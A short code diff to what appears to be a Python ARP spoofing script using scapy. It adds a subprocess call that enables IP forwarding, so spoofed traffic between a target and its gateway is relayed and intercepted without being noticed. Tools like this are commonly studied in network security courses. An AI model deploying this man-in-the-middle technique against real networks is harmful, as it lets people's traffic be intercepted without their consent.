@@ -4,6 +4,7 @@ import scapy.all as scapy
 import time
 import sys
 import optparse
+import subprocess
 
 def get_arguments():
     parser = optparse.OptionParser()
@@ -35,6 +36,7 @@ def restore(destination_ip, source_ip):
 
 
 def main(target_ip, gateway_ip):
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     sent_packet_count = 0
     while True:
         spoof(target_ip, gateway_ip)
